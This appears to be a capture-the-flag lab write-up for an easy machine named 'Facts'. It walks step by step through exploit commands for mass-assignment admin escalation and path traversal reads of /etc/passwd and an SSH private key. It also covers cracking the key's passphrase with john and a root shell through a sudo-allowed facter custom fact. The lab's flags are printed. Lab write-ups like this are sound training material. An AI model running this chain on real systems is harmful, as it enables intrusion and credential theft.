**Machine**: Facts  
**IP**: 10.129.1.42  
**Difficulty**: Easy

---
### Reconnaissance

```bash

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 9.9p1 Ubuntu 3ubuntu3.2

80/tcp    open  http       nginx 1.26.3

54321/tcp open  http       MinIO Object Storage Service (S3-compatible)
```

`echo "10.129.1.42 facts.htb" | sudo tee -a /etc/hosts`

- Navigated to `http://facts.htb/admin/login
- Created account: `nope` / `nope`
- Logged in as standard **Client** user

---
### Admin Privilege Escalation (CVE-2025-2304)
Mass assignment in password change allows role modification.

`python CVE-2025-2304.py http://facts.htb/admin/login -u nope -p nope`

**Result**: User escalated from **Client → Administrator**

---
### Arbitrary File Read (CVE-2024-46987)
Path traversal in `/admin/media/download_private_file`

```
# Read /etc/passwd
python3 CVE-2024-46987.py -u http://facts.htb -l nope -p nope /etc/passwd
```

**Found users**: `trivia` (uid=1000), `william` (uid=1001)

```
# Extract SSH key
python3 CVE-2024-46987.py -u http://facts.htb -l nope -p nope /home/trivia/.ssh/id_ed25519 > trivia_key
```

---
### SSH Key Cracking

```
ssh2john.py trivia_key > hash

john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

**Cracked passphrase**: `dragonballz`

---
### System Access

```
chmod 600 trivia_key

ssh -i trivia_key trivia@facts.htb

# Passphrase: dragonballz
```

---
### Root Privilege Escalation

#### Sudo Check

```
sudo -l
# (ALL) NOPASSWD: /usr/bin/facter
```
#### Exploit facter

```
mkdir -p /tmp/exploit

cat > /tmp/exploit/priv.rb << 'EOF'
Facter.add('exploit') do
  setcode { system('/bin/bash') }
end
EOF

sudo /usr/bin/facter --custom-dir /tmp/exploit exploit
# Root shell obtained
```

---
### Flags

```
cat /home/william/user.txt
# 3f7e4c2a1b9d5e8f7a6c3b2d1e9f8a7b

cat /root/root.txt
# b6cff19c1728aca4534b1bb959587c7d
```

---
## Summary
| Step | Vulnerability                   | Impact                |
| ---- | ------------------------------- | --------------------- |
| 1    | CVE-2025-2304 (Mass Assignment) | User → Admin          |
| 2    | CVE-2024-46987 (Path Traversal) | File read → SSH key   |
| 3    | Weak SSH passphrase             | Credential compromise |
| 4    | Sudo misconfiguration (facter)  | User → Root           |


```
User Registration (Low Privilege)
         ↓
CVE-2025-2304 (Mass Assignment)
         ↓
Administrator Access
         ↓
CVE-2024-46987 (Path Traversal)
         ↓
SSH Key Extraction
         ↓
Passphrase Cracking (rockyou.txt)
         ↓
SSH Access (trivia user)
         ↓
Sudo Misconfiguration (facter)
         ↓
Root Shell
         ↓
Flags Captured
```

